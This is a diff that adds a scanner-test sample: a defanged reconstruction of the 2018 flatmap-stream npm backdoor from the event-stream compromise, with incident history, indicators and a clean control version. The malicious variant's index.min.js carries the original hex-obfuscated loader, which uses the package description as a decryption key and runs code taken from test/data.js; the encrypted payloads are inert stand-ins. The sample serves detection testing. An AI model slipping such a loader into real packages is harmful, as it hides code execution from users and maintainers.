@@ -1,0 +1,218 @@
+# Defanged reconstruction of a real malicious package, for scanner tests.
+# Never extract and run. See internal/e2e/livescan/corpus.go.
+id: flatmap-stream-0.1.1
+title: "flatmap-stream 0.1.1 (npm): wallet-targeted loader slipped into event-stream's dependencies"
+campaign: event-stream-2018
+date: "2018-10-05"
+kind: npm
+ecosystem: npm
+name: flatmap-stream
+version: "0.1.1"
+benignVersion: "0.1.0"
+summary: >-
+  event-stream, a stream utility with roughly 1.5 to 2 million downloads a week
+  (reports differ), got a new maintainer in 2018: its author gave publish
+  rights to the GitHub user right9ctrl, who had emailed offering to take it
+  over. On 2018-09-09 that account added a dependency on flatmap-stream, with
+  the caret range ^0.1.0, in event-stream 3.3.6. flatmap-stream 0.1.0 was
+  clean; 0.1.1, published on 2018-10-05 (Snyk, Arvanitis et al. and the
+  registry listing agree), fell inside the range, so every fresh install of
+  event-stream pulled it in. The code was not in the readable index.js or in
+  the project's GitHub repository: it was appended to the published, minified
+  index.min.js, and the data it used shipped in test/data.js, a file that
+  looked like a test fixture and was also missing from GitHub. The appended
+  loader, its strings hex-encoded, read the npm_package_description variable
+  npm sets for the package being built, used it as the AES-256 key for the
+  first entry of test/data.js, compiled the result with module._compile and
+  called it with the second entry, all inside a try/catch that swallowed every
+  failure. Brute-forcing published package descriptions found the one that
+  decrypted it, "A Secure Bitcoin Wallet", Copay's. In Copay release builds
+  the next stage patched a dependency of the app so that a third stage ran
+  inside the wallet, checked the balances and, above 100 BTC or 1000 BCH, sent
+  account data and private keys to a collection server (Copay 5.0.2 to 5.1.0
+  shipped with it). The release was live for about seven weeks. A Node 11
+  deprecation warning for crypto.createDecipher (nodemon issue, 2018-10-29)
+  led a user to open event-stream issue 116 on 2018-11-20, and npm removed
+  flatmap-stream and event-stream 3.3.6 on 2018-11-26.
+techniques: [maintainer-handover, dependency-injection, minified-code-injection, registry-repo-mismatch, hex-encoded-strings, environment-keyed-decryption, targeted-payload, build-time-injection]
+reconstruction: >-
+  index.min.js is the clean minified stream with the first-stage loader
+  appended, in the form the es-incident analysis prints it (F5 walks through
+  the same code): an immediately invoked function in a try block with an empty
+  catch, a helper e() that hex-decodes every string, the hex-encoded
+  "./test/data" required, the npm_package_description lookup on process.env,
+  createDecipher("aes256", ...) over the first entry, a new module built from
+  module.constructor, _compile, and a call to its export with the second entry.
+  The string table (entries 2 to 9 of the array: hex-encoded crypto, env,
+  npm_package_description, aes256, createDecipher, _compile, hex, utf8) sits in
+  test/data.js as in the original. Entries 0 and 1, which held the encrypted
+  second and third stages, are short random hex stand-ins that cannot decrypt
+  to anything under any key; nothing of those stages (the release-build
+  injector, the wallet harvester, the collection server) is reproduced. The
+  file set (index.js, index.min.js, package.json, perf-test.js, README.md,
+  LICENSE.txt, test/data.js) is the real 0.1.1's as listed in Jayden Seric's
+  evidence archive; index.js, perf-test.js, the README and the license are
+  small stand-ins (a flat-mapping through stream) and index.min.js is a
+  hand-minified copy of index.js. The main field of package.json is
+  index.min.js, an assumption: the loader can only run if that file is the
+  entry point, and no source read for this sample prints the field. The 0.1.0
+  control has the same files without the appended loader and without
+  test/data.js.
+references:
+  - https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident
+  - https://snyk.io/blog/a-post-mortem-of-the-malicious-event-stream-backdoor/
+  - https://github.com/dominictarr/event-stream/issues/116
+  - https://es-incident.github.io/payloads.html
+  - https://www.f5.com/company/blog/reverse-engineering-by-example-flatmap-stream-payload-a
+  - https://github.com/advisories/GHSA-9x64-5r7x-2q53
+  - https://github.com/bitpay/wallet/issues/9346
+  - https://jaydenseric.com/blog/event-stream-compromise
+  - https://libraries.io/npm/flatmap-stream
+indicators:
+  - "2e2f746573742f64617461"
+  - "6e706d5f7061636b6167655f6465736372697074696f6e"
+  - "6372656174654465636970686572"
+-- shared/index.js --
+var Stream = require('stream').Stream
+
+// flatmap(mapper) returns a through stream. Every chunk written to it is
+// passed to the mapper, and the array the mapper returns is emitted element
+// by element. A single value is emitted as it is; null and undefined drop
+// the chunk.
+module.exports = function flatmap (mapper) {
+  var stream = new Stream()
+
+  stream.readable = true
+  stream.writable = true
+
+  stream.write = function (data) {
+    var out = mapper(data)
+    if (!Array.isArray(out)) out = out == null ? [] : [out]
+    out.forEach(function (item) {
+      stream.emit('data', item)
+    })
+    return true
+  }
+
+  stream.end = function (data) {
+    if (arguments.length) stream.write(data)
+    stream.writable = false
+    stream.emit('end')
+    stream.emit('close')
+  }
+
+  stream.destroy = function () {
+    stream.writable = stream.readable = false
+    stream.emit('close')
+  }
+
+  stream.pause = function () {}
+  stream.resume = function () {}
+
+  return stream
+}
+-- shared/perf-test.js --
+var N = 200000
+
+;['./index.js', './index.min.js'].forEach(function (file) {
+  var flatmap = require(file)
+  var emitted = 0
+  var stream = flatmap(function (n) { return [n, n + 1] })
+
+  stream.on('data', function () { emitted++ })
+
+  var start = Date.now()
+  for (var i = 0; i < N; i++) stream.write(i)
+  stream.end()
+
+  console.log(file + ': ' + emitted + ' chunks in ' + (Date.now() - start) + 'ms')
+})
+-- shared/README.md --
+# flatmap-stream
+
+A through stream that turns every chunk written to it into zero, one or many
+chunks.
+
+    var flatmap = require('flatmap-stream')
+
+    var words = flatmap(function (line) { return line.split(' ') })
+
+    words.on('data', function (word) { console.log(word) })
+    words.write('a b c')   // a, b, c
+    words.end()
+
+The mapper may return an array (each element is emitted), a single value
+(emitted as it is) or nothing (the chunk is dropped).
+
+`index.min.js` is the minified build of `index.js`.
+-- shared/LICENSE.txt --
+MIT License
+
+Copyright (c) 2018 flatmap-stream contributors
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
+-- benign/package.json --
+{
+  "name": "flatmap-stream",
+  "version": "0.1.0",
+  "description": "A through stream that emits zero, one or many chunks for every chunk written to it",
+  "main": "index.min.js",
+  "scripts": {
+    "perf": "node perf-test.js"
+  },
+  "keywords": [
+    "stream",
+    "flatmap",
+    "through"
+  ],
+  "license": "MIT"
+}
+-- benign/index.min.js --
+var Stream=require("stream").Stream;module.exports=function(t){var e=new Stream;return e.readable=!0,e.writable=!0,e.write=function(r){var n=t(r);return Array.isArray(n)||(n=null==n?[]:[n]),n.forEach(function(t){e.emit("data",t)}),!0},e.end=function(t){arguments.length&&e.write(t),e.writable=!1,e.emit("end"),e.emit("close")},e.destroy=function(){e.writable=e.readable=!1,e.emit("close")},e.pause=function(){},e.resume=function(){},e};
+-- malicious/package.json --
+{
+  "name": "flatmap-stream",
+  "version": "0.1.1",
+  "description": "A through stream that emits zero, one or many chunks for every chunk written to it",
+  "main": "index.min.js",
+  "scripts": {
+    "perf": "node perf-test.js"
+  },
+  "keywords": [
+    "stream",
+    "flatmap",
+    "through"
+  ],
+  "license": "MIT"
+}
+-- malicious/index.min.js --
+var Stream=require("stream").Stream;module.exports=function(t){var e=new Stream;return e.readable=!0,e.writable=!0,e.write=function(r){var n=t(r);return Array.isArray(n)||(n=null==n?[]:[n]),n.forEach(function(t){e.emit("data",t)}),!0},e.end=function(t){arguments.length&&e.write(t),e.writable=!1,e.emit("end"),e.emit("close")},e.destroy=function(){e.writable=e.readable=!1,e.emit("close")},e.pause=function(){},e.resume=function(){},e};!function(){try{var r=require,t=process;function e(r){return Buffer.from(r,"hex").toString()}var n=r(e("2e2f746573742f64617461")),o=t[e(n[3])][e(n[4])];if(!o)return;var u=r(e(n[2]))[e(n[6])](e(n[5]),o),a=u.update(n[0],e(n[8]),e(n[9]));a+=u.final(e(n[9]));var f=new module.constructor;f.paths=module.paths,f[e(n[7])](a,""),f.exports(n[1])}catch(r){}}();
+-- malicious/test/data.js --
+module.exports = [
+  "e9a0c3998052a6a92f57b2b7ff765e7110e33379e6071e62e79eef1685e539810611a29bd94375fced953db8a6bea3f8",
+  "cde236a8e76d85c9dc841488e8832262b774f2ee8030b4b759c5ce2a7d3c17d2",
+  "63727970746f",
+  "656e76",
+  "6e706d5f7061636b6167655f6465736372697074696f6e",
+  "616573323536",
+  "6372656174654465636970686572",
+  "5f636f6d70696c65",
+  "686578",
+  "75746638"
+]
